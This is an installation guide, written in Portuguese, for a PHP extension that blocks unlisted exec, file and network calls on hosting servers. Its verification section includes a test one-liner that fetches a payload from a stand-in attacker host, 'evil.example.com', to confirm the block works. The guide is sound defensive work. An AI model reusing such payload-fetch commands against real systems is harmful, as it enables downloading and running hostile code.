# Guia de Instalação — PHP Security Guard

## Índice

- [Pré-requisitos](#pré-requisitos)
- [Estrutura de versões PHP no CWP](#estrutura-de-versões-php-no-cwp)
- [Instalação rápida](#instalação-rápida)
- [Instalação passo a passo](#instalação-passo-a-passo)
- [Configuração inicial](#configuração-inicial)
- [Ativação por versão PHP](#ativação-por-versão-php)
- [Verificação](#verificação)
- [Instalação em múltiplas versões](#instalação-em-múltiplas-versões)
- [Desinstalação](#desinstalação)
- [Solução de problemas](#solução-de-problemas)
- [Referências de path por painel](#referências-de-path-por-painel)

---

## Pré-requisitos

Antes de instalar, certifique-se de que o servidor possui:

```bash
# Ferramentas de compilação
yum install -y gcc make autoconf

# Headers do PHP (necessário para cada versão alvo)
# CWP — os headers já vêm com o pacote da versão PHP
# cPanel — ea-phpXX-php-devel
# Genérico — php-devel ou php8.3-dev

# libssl (para validação de URLs com HTTPS)
yum install -y openssl-devel
```

Versão mínima suportada: **PHP 8.3** (PHP-FPM, Linux x86_64).

---

## Estrutura de versões PHP no CWP

O CWP instala cada versão do PHP em um diretório próprio:

```text
/usr/local/php74/     ← PHP 7.4
/usr/local/php80/     ← PHP 8.0
/usr/local/php81/     ← PHP 8.1
/usr/local/php82/     ← PHP 8.2
/usr/local/php83/     ← PHP 8.3  ← mínimo suportado
```

Cada versão possui:

```text
/usr/local/phpXX/
  bin/
    php          ← interpretador
    phpize       ← ferramenta de build de extensões
    php-config   ← configuração de build
  etc/
    php.d/       ← diretório de INI extras (um por extensão)
  lib/
    php/
      extensions/ ← onde o .so é instalado
```

Para listar as versões disponíveis no seu servidor:

```bash
ls /usr/local/php*/bin/phpize 2>/dev/null
```

---

## Instalação rápida

O script `install.sh` detecta o ambiente e lista as versões disponíveis para seleção interativa.

```bash
# Clone ou copie o projeto para o servidor
cd /usr/local/src
git clone https://github.com/seu-usuario/php-security-guard.git
cd php-security-guard

# Execute como root
sudo bash install.sh
```

O script irá:

1. Detectar o painel (CWP, cPanel, DirectAdmin, genérico).
2. Listar todas as versões PHP com `phpize` disponível.
3. Solicitar qual versão compilar.
4. Compilar e instalar a extensão.
5. Criar os diretórios de configuração e log.
6. Instalar o arquivo `.ini` no diretório correto da versão.

---

## Instalação passo a passo

Se preferir controle manual, siga os passos abaixo escolhendo sua versão.

### 1. Identificar a versão alvo

```bash
# Listar versões disponíveis no CWP
for dir in /usr/local/php*/; do
    phpize="$dir/bin/phpize"
    [ -x "$phpize" ] && echo "$dir"
done
```

Exemplo de saída:

```text
/usr/local/php81/
/usr/local/php82/
/usr/local/php83/
```

Escolha a versão. Os próximos exemplos usam **PHP 8.3** (`php83`).

### 2. Definir variáveis de ambiente

```bash
PHP_VER="83"
PHP_BASE="/usr/local/php${PHP_VER}"
PHPIZE="${PHP_BASE}/bin/phpize"
PHP_CONFIG="${PHP_BASE}/bin/php-config"
```

### 3. Compilar a extensão

```bash
cd /usr/local/src/php-security-guard

# Limpa build anterior se existir
$PHPIZE --clean 2>/dev/null || true

# Prepara o ambiente de build para esta versão do PHP
$PHPIZE

# Configura e compila
./configure --enable-security-guard --with-php-config="$PHP_CONFIG"
make -j$(nproc)
make install
```

O arquivo `.so` é instalado automaticamente no diretório de extensões da versão:

```bash
# Confirmar o caminho de instalação
$PHP_CONFIG --extension-dir
# Exemplo: /usr/local/php83/lib/php/extensions/no-debug-non-zts-20230831
```

### 4. Criar diretórios de configuração

Estes diretórios são compartilhados entre todas as versões PHP:

```bash
install -d -m 750 -o root -g root /etc/security_guard
install -d -m 750 -o root -g root /var/log/security_guard
install -d -m 750 -o root -g root /var/log/security_guard/users
```

### 5. Instalar os arquivos de whitelist de exemplo

```bash
for f in allowed_commands.conf allowed_files.conf allowed_network.conf; do
    install -m 640 -o root -g root etc/$f /etc/security_guard/$f
done
```

### 6. Instalar o arquivo INI

O arquivo INI deve ficar no diretório `php.d` da versão PHP alvo:

```bash
INI_DIR="${PHP_BASE}/etc/php.d"
mkdir -p "$INI_DIR"
install -m 640 -o root -g root php_security_guard.ini "$INI_DIR/security_guard.ini"
```

---

## Configuração inicial

Edite o arquivo INI instalado antes de reiniciar o PHP-FPM:

```bash
vim /usr/local/php83/etc/php.d/security_guard.ini
```

### Fase 1 — Modo monitor (recomendado para início)

Comece com `monitor` para observar o que seria bloqueado sem afetar os sites:

```ini
security_guard.enabled = 1
security_guard.enforcement_mode = monitor

security_guard.log_denied = 1
security_guard.log_allowed = 0
security_guard.log_scope = per_user
security_guard.log_path = /var/log/security_guard
```

### Fase 2 — Populando as whitelists

Monitore os logs por alguns dias para identificar chamadas legítimas:

```bash
# Ver violações detectadas em modo monitor
tail -f /var/log/security_guard/users/*.log | python3 -m json.tool
```

Adicione as entradas necessárias aos arquivos de configuração:

```bash
# Exemplo: liberar binário para exec/shell_exec
echo "command|/usr/bin/optipng|$(date -Iseconds)|admin|Otimização PNG" \
    >> /etc/security_guard/allowed_commands.conf

# Exemplo: liberar diretório de uploads
echo "file|/home/cliente1/public_html/wp-content/uploads|$(date -Iseconds)|admin|Uploads WP" \
    >> /etc/security_guard/allowed_files.conf

# Exemplo: liberar domínio de API
echo "domain|api.mercadopago.com|$(date -Iseconds)|admin|Gateway MercadoPago" \
    >> /etc/security_guard/allowed_network.conf
```

### Fase 3 — Ativando o bloqueio

Quando as whitelists estiverem estáveis, ative o bloqueio:

```bash
PHP_VER="83"
INI_FILE="/usr/local/php${PHP_VER}/etc/php.d/security_guard.ini"

sed -i 's/enforcement_mode = monitor/enforcement_mode = block/' "$INI_FILE"

systemctl restart php-fpm${PHP_VER}
```

---

## Ativação por versão PHP

### CWP — reiniciar o serviço FPM da versão correta

```bash
# PHP 8.3
systemctl restart php-fpm83

# PHP 8.2
systemctl restart php-fpm82

# PHP 8.1
systemctl restart php-fpm81
```

Se o CWP usar o servidor web integrado `cwpsrv`:

```bash
systemctl restart cwpsrv
```

Para verificar o serviço correto da sua instalação CWP:

```bash
systemctl list-units 'php-fpm*' --no-pager
```

### cPanel — via WHM ou linha de comando

```bash
# PHP 8.3 no cPanel (EasyApache 4)
systemctl restart ea-php83-php-fpm

# Ou via script cPanel
/usr/local/cpanel/bin/build_apache_conf
/scripts/restartsrv_apache
```

### Genérico

```bash
systemctl restart php-fpm
# ou
service php8.3-fpm restart
```

---

## Verificação

### Confirmar que a extensão carregou

```bash
# CLI da versão específica
/usr/local/php83/bin/php -m | grep security_guard

# phpinfo
/usr/local/php83/bin/php -r "phpinfo();" | grep -A5 security_guard
```

Saída esperada:

```text
security_guard
...
security_guard support => enabled
Version => 0.3.0
Enforcement mode => monitor
```

### Verificar INI ativo

```bash
/usr/local/php83/bin/php --ini | grep security_guard
```

### Teste rápido de bloqueio

Crie um script PHP temporário como um usuário de site e execute via CLI da versão:

```bash
# Como usuário do site (não root)
su - cliente1 -s /bin/bash -c '
    /usr/local/php83/bin/php -r "
        ini_set(\"security_guard.enforcement_mode\", \"block\");
        \$r = @file_get_contents(\"http://evil.example.com/payload\");
        var_dump(\$r);
    "
'
```

Resultado esperado: `bool(false)` com entrada no log.

### Verificar logs

```bash
# Log global
tail -20 /var/log/security_guard/security_guard.log

# Log por usuário
tail -20 /var/log/security_guard/users/cliente1.log

# Somente bloqueios
grep '"action":"deny"' /var/log/security_guard/users/cliente1.log | jq .
```

---

## Instalação em múltiplas versões

Quando o servidor tiver sites usando diferentes versões PHP, instale a extensão em cada uma:

```bash
for VER in 81 82 83; do
    echo "=== Instalando para PHP ${VER} ==="
    bash install.sh --php-version "$VER" --mode monitor --yes
    systemctl restart "php-fpm${VER}" 2>/dev/null || true
done
```

Os arquivos de whitelist em `/etc/security_guard/` são compartilhados entre todas as versões — uma única política centralizada.

---

## Desinstalação

### Via script

```bash
# Remove a extensão de uma versão específica
sudo bash install.sh --php-version 83 --uninstall
```

### Manual

```bash
PHP_VER="83"
PHP_BASE="/usr/local/php${PHP_VER}"
EXT_DIR="$($PHP_BASE/bin/php-config --extension-dir)"

# Remover .so e INI
rm -f "$EXT_DIR/security_guard.so"
rm -f "$PHP_BASE/etc/php.d/security_guard.ini"

# Reiniciar FPM
systemctl restart "php-fpm${PHP_VER}"

# Remover configurações e logs (OPCIONAL — preserva histórico)
# rm -rf /etc/security_guard /var/log/security_guard
```

---

## Solução de problemas

### A extensão não aparece em `php -m`

```bash
# Verificar se o .so existe
ls -la /usr/local/php83/lib/php/extensions/*/security_guard.so

# Verificar se o INI está sendo lido
/usr/local/php83/bin/php --ini

# Verificar erro de carga
/usr/local/php83/bin/php -r "echo 1;" 2>&1
```

### Erro de compilação: `php.h not found`

O CWP normalmente inclui os headers. Se não incluir:

```bash
# Verificar se os headers existem
ls /usr/local/php83/include/php/

# Se ausentes, reinstalar o pacote PHP no CWP
# Admin → PHP Selector → Reinstall PHP 8.3
```

### PHP-FPM não reinicia após instalação

```bash
# Ver logs do FPM
journalctl -u php-fpm83 -n 50 --no-pager

# Testar configuração
/usr/local/php83/sbin/php-fpm --test
```

### Sites retornando 500 após ativação do modo `block`

A causa mais comum é um site fazendo chamadas a arquivos ou URLs não listadas nas whitelists.

```bash
# Verificar em modo monitor primeiro
sed -i 's/enforcement_mode = block/enforcement_mode = monitor/' \
    /usr/local/php83/etc/php.d/security_guard.ini
systemctl restart php-fpm83

# Revisar o log de violações
grep '"action":"deny"\|"action":"monitor_violation"' \
    /var/log/security_guard/users/*.log | jq -r '.target' | sort | uniq -c | sort -rn
```

Adicione as entradas faltantes às whitelists e retorne para `block`.

### Wildcard rejeitado com aviso

```text
security_guard: wildcard '*.foo.com' has no base domain 'foo.com' in allowed_network
```

Adicione o domínio-base antes do wildcard:

```bash
# Ordem importa na validação; adicione o base domain primeiro
echo "domain|foo.com|$(date -Iseconds)|admin|Domínio base" >> /etc/security_guard/allowed_network.conf
echo "domain|*.foo.com|$(date -Iseconds)|admin|Subdomínios" >> /etc/security_guard/allowed_network.conf
```

---

## Referências de path por painel

| Painel | phpize | php-config | INI extras | Serviço FPM |
|---|---|---|---|---|
| **CWP** | `/usr/local/phpXX/bin/phpize` | `/usr/local/phpXX/bin/php-config` | `/usr/local/phpXX/etc/php.d/` | `php-fpmXX` |
| **cPanel EA4** | `/opt/cpanel/ea-phpXX/root/usr/bin/phpize` | `/opt/cpanel/ea-phpXX/root/usr/bin/php-config` | `/opt/cpanel/ea-phpXX/root/etc/php.d/` | `ea-phpXX-php-fpm` |
| **DirectAdmin** | `/usr/local/php/XX/bin/phpize` | `/usr/local/php/XX/bin/php-config` | `/usr/local/php/XX/lib/php.conf.d/` | `php-fpm-XX` |
| **HestiaCP** | `/etc/php/X.X/fpm/` (via `phpize`) | `php-config8.X` | `/etc/php/X.X/fpm/conf.d/` | `php8.X-fpm` |
| **Genérico** | `phpize` | `php-config` | `/etc/php.d/` | `php-fpm` |

Substitua `XX` pelo número da versão sem ponto (ex: `83` para PHP 8.3).

---

## Instalação do Plugin CWP (Control Web Panel)

O projeto inclui uma classe PHP pronta para gerenciar as whitelists da extensão diretamente através do painel de administração do CWP. Esta classe (`SecurityGuardPlugin.php`) atua como uma camada de abstração (backend) para ler e gravar os arquivos `.conf`.

### Passos de Integração

1. **Copiar a Classe:**
   Copie o arquivo `cwp-plugin/SecurityGuardPlugin.php` para o diretório de módulos customizados do seu painel CWP (normalmente `/usr/local/cwpsrv/htdocs/resources/admin/modules/` ou um subdiretório de includes do seu tema/módulo).

2. **Ajuste de Permissões (Crítico):**
   Para que a interface web do CWP consiga gravar as regras, o usuário sob o qual o painel CWP roda (geralmente `cwpsrv`) deve ter permissão de escrita no diretório `/etc/security_guard/`.
   Execute no terminal:
   ```bash
   chown -R cwpsrv:cwpsrv /etc/security_guard
   chmod 770 /etc/security_guard
   chmod 660 /etc/security_guard/*.conf
   ```

3. **Instalação da Tela do Painel (Frontend + Backend):**
   O projeto agora inclui uma interface gráfica pronta (`index.php`) construída com Bootstrap, pronta para ser acoplada ao CWP.
   Copie o arquivo `cwp-plugin/index.php` para o mesmo diretório onde você colocou a classe `SecurityGuardPlugin.php` (por exemplo: `/usr/local/cwpsrv/htdocs/resources/admin/modules/security_guard/`).

4. **Acesso no Painel:**
   Se você seguiu o padrão de módulos do CWP, basta acessar a URL do módulo (algo como `https://seu-ip:2031/admin/index.php?module=security_guard`) e você verá a tela de gerenciamento.
   
   *Nota: O script `index.php` foi feito para rodar integrado ao fluxo do CWP e já cuida do processamento dos formulários e da renderização das tabelas HTML (Comandos, Arquivos e Redes).*

---

## Próximos passos

Após a instalação básica, consulte:

- `CONFIGURATION.md` — referência completa de todas as diretivas INI
- `SECURITY.md` — limitações conhecidas e integração com outras camadas
- `cwp-plugin/` — backend PHP para gerenciamento das whitelists via CWP
